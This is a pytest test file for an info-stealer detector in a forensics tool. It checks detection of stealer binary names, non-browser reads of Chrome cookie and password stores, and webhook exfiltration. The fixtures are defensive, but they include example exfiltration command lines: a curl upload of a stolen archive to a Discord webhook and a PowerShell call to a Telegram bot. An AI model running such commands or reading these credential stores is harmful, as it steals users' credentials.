"""InfoStealerDetector tests."""

from __future__ import annotations

import pytest

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.info_stealer import (
    CORRELATION_WINDOW_S,
    InfoStealerDetector,
)


def _store(tmp_path):
    return EvidenceStore(tmp_path / "evidence.db")


def _proc(store, pid, name, *, exe=None, cmdline=None, username="alice",
          open_files=None, connections=None, ts=None):
    cm = cmdline if isinstance(cmdline, list) else \
        ([cmdline] if cmdline else [name])
    data = {
        "pid": pid, "ppid": 1, "name": name,
        "exe": exe or f"/usr/bin/{name}",
        "cmdline": cm, "username": username,
        "open_files": open_files or [],
        "connections": connections or [],
    }
    if ts is not None:
        data["create_time"] = ts
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject=f"pid={pid} {name}", data=data,
    ))


# ---- S1 stealer-binary-name match ---- #


@pytest.mark.parametrize("name,want_family_part", [
    ("lumma", "Lumma"),
    ("lummac2", "LummaC2"),
    ("redline.exe", "RedLine"),
    ("vidar.exe", "Vidar"),
    ("stealc.exe", "StealC"),
    ("raccoon.exe", "Raccoon"),
    ("metastealer.exe", "MetaStealer"),
    ("amos", "AMOS"),
    ("recordbreaker.exe", "RecordBreaker"),
])
def test_s1_known_stealer_binary_critical(tmp_path, name, want_family_part):
    store = _store(tmp_path)
    _proc(store, 100, name, exe=f"/tmp/.staged/{name}")
    findings = list(InfoStealerDetector().detect(store))
    hits = [f for f in findings
            if f.evidence.get("kind") == "stealer_binary_name"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].mitre == "T1555.003"
    assert want_family_part in hits[0].evidence.get("family", "")
    store.close()


def test_s1_unrelated_binary_not_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 100, "notepad.exe", exe="C:\\Windows\\notepad.exe")
    findings = list(InfoStealerDetector().detect(store))
    assert [f for f in findings
            if f.evidence.get("kind") == "stealer_binary_name"] == []
    store.close()


# ---- S2 non-browser process reading cookie DB ---- #


def test_s2_python_reading_chrome_cookies_high(tmp_path):
    """python3 opening Chrome Cookies → high-severity finding."""
    store = _store(tmp_path)
    _proc(store, 100, "python3",
          exe="/usr/bin/python3",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/Default/Cookies",
          ])
    findings = list(InfoStealerDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cookies"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "high"
    assert hits[0].mitre == "T1555.003"
    store.close()


def test_s2_chrome_itself_reading_cookies_not_flagged(tmp_path):
    """Legitimate browser opening its own Cookies DB is fine."""
    store = _store(tmp_path)
    _proc(store, 100, "chrome",
          exe="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/Default/Cookies",
          ])
    findings = list(InfoStealerDetector().detect(store))
    assert [f for f in findings
            if f.evidence.get("kind") == "cookies"] == []
    store.close()


def test_s2_brave_helper_reading_cookies_not_flagged(tmp_path):
    """Helper subprocesses of a browser also legitimately access
    cookies (Chromium spawns Helper / Renderer / Network)."""
    store = _store(tmp_path)
    _proc(store, 100, "Google Chrome Helper (Network)",
          exe="/Applications/Google Chrome.app/Contents/Frameworks/"
              "Google Chrome Framework.framework/Versions/Current/"
              "Helpers/Google Chrome Helper.app/Contents/MacOS/"
              "Google Chrome Helper",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/"
              "Default/Cookies",
          ])
    findings = list(InfoStealerDetector().detect(store))
    assert [f for f in findings
            if f.evidence.get("kind") == "cookies"] == []
    store.close()


def test_s2_node_reading_login_data_high(tmp_path):
    """Login Data is the saved-passwords DB."""
    store = _store(tmp_path)
    _proc(store, 100, "node",
          exe="/usr/bin/node",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/"
              "Default/Login Data",
          ])
    findings = list(InfoStealerDetector().detect(store))
    hits = [f for f in findings
            if f.evidence.get("kind") == "login_data"]
    assert hits
    assert hits[0].severity == "high"
    store.close()


# ---- S3 Local State (DPAPI key) — critical ---- #


def test_s3_python_reading_local_state_critical(tmp_path):
    """Local State holds the DPAPI key for cookie decryption — even
    higher severity than reading the cookie DB itself."""
    store = _store(tmp_path)
    _proc(store, 100, "python3",
          exe="/usr/bin/python3",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/"
              "Local State",
          ])
    findings = list(InfoStealerDetector().detect(store))
    hits = [f for f in findings
            if f.evidence.get("kind") == "local_state_key"]
    assert hits
    assert hits[0].severity == "critical"
    store.close()


# ---- S4 correlation (cookie read + exfil) ---- #


def test_s4_cookie_read_then_webhook_exfil_critical(tmp_path):
    """The canonical info-stealer fingerprint: same pid reads the
    cookie DB AND has outbound to webhook.site within 30s."""
    store = _store(tmp_path)
    base_ts = 1_700_000_000
    _proc(store, 100, "stealth",
          exe="/tmp/.x/stealth",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/"
              "Default/Cookies",
          ],
          connections=[
              {"raddr": ("webhook.site", 443),
               "status": "ESTABLISHED"},
          ],
          ts=base_ts)
    findings = list(InfoStealerDetector().detect(store))
    correlation = [f for f in findings
                   if f.evidence.get("kind") == "stealer_correlation"]
    assert correlation
    assert correlation[0].severity == "critical"
    assert correlation[0].evidence.get("exfil_host") == "webhook.site"
    assert correlation[0].evidence.get("window_s") == CORRELATION_WINDOW_S
    store.close()


def test_s4_cookie_read_without_exfil_no_correlation(tmp_path):
    """Cookie read alone fires S2 (high) but NOT S4 (critical
    correlation)."""
    store = _store(tmp_path)
    _proc(store, 100, "python3",
          exe="/usr/bin/python3",
          open_files=[
              "/Users/alice/Library/Application Support/Google/Chrome/"
              "Default/Cookies",
          ])
    findings = list(InfoStealerDetector().detect(store))
    s2 = [f for f in findings if f.evidence.get("kind") == "cookies"]
    s4 = [f for f in findings
          if f.evidence.get("kind") == "stealer_correlation"]
    assert len(s2) == 1
    assert s4 == []
    store.close()


# ---- S5 stealer C2 in cmdline / connections ---- #


def test_s5_discord_webhook_in_cmdline_high(tmp_path):
    store = _store(tmp_path)
    _proc(store, 100, "curl",
          cmdline=["curl", "-F", "file=@/tmp/stolen.zip",
                   "https://discord.com/api/webhooks/123/abc"])
    findings = list(InfoStealerDetector().detect(store))
    hits = [f for f in findings
            if f.evidence.get("kind") == "stealer_c2"]
    assert hits
    assert hits[0].mitre == "T1041"
    assert "discord" in hits[0].evidence.get("host", "")
    store.close()


def test_s5_telegram_bot_in_cmdline(tmp_path):
    store = _store(tmp_path)
    _proc(store, 100, "powershell.exe",
          cmdline=["powershell.exe", "-c",
                   "Invoke-WebRequest https://api.telegram.org/"
                   "bot12345:ABC/sendDocument"])
    findings = list(InfoStealerDetector().detect(store))
    hits = [f for f in findings
            if f.evidence.get("kind") == "stealer_c2"]
    assert hits
    store.close()


def test_s5_doesnt_double_emit_when_s1_already_fired(tmp_path):
    """If a process matches BOTH stealer-binary-name (S1) AND touches
    a known C2 host (S5), only emit S1 (the family-attributed
    finding) — don't double-count."""
    store = _store(tmp_path)
    _proc(store, 100, "lumma",
          cmdline=["lumma", "https://webhook.site/abc"])
    findings = list(InfoStealerDetector().detect(store))
    s1 = [f for f in findings
          if f.evidence.get("kind") == "stealer_binary_name"]
    s5 = [f for f in findings
          if f.evidence.get("kind") == "stealer_c2"]
    assert len(s1) == 1
    assert s5 == []   # suppressed when S1 already attributed
    store.close()


# ---- open_files dict shape ---- #


def test_open_files_dict_shape_also_parsed(tmp_path):
    """The ProcessCollector emits open_files as either a list of
    strings OR list of dicts. Both should be parsed."""
    store = _store(tmp_path)
    _proc(store, 100, "python3",
          exe="/usr/bin/python3",
          open_files=[
              {"path": "/Users/alice/Library/Application Support/"
                       "Google/Chrome/Default/Cookies",
               "fd": 7},
          ])
    findings = list(InfoStealerDetector().detect(store))
    assert any(f.evidence.get("kind") == "cookies" for f in findings)
    store.close()


# ---- registration + sigma + heatmap ---- #


def test_detector_registered():
    from digger.detectors import all_detectors
    assert "info_stealer" in [d.name for d in all_detectors()]


def test_sigma_template_present():
    tpl = InfoStealerDetector().to_sigma_template()
    assert tpl is not None
    assert tpl["level"] == "critical"
    assert "attack.t1555.003" in tpl["tags"]
    assert "attack.t1041" in tpl["tags"]
    sels = [k for k in tpl["detection"] if k.startswith("selection_")]
    assert len(sels) >= 2


def test_heatmap_includes_t1555_003():
    from digger.genrule.heatmap import build_coverage
    cov = build_coverage()
    # T1555.003 is Credentials from Web Browsers, which is in the
    # Credential Access tactic — the heatmap should now show our
    # info_stealer detector covering it.
    techniques = cov.get("techniques") or {}
    if "T1555.003" in techniques:
        detectors = techniques["T1555.003"]["detectors"]
        assert "info_stealer" in detectors


# ---- clean negatives ---- #


def test_no_findings_when_unrelated_processes(tmp_path):
    store = _store(tmp_path)
    _proc(store, 100, "vim", exe="/usr/bin/vim",
          cmdline=["vim", "/etc/hosts"])
    _proc(store, 101, "git", cmdline=["git", "log"])
    findings = list(InfoStealerDetector().detect(store))
    assert findings == []
    store.close()
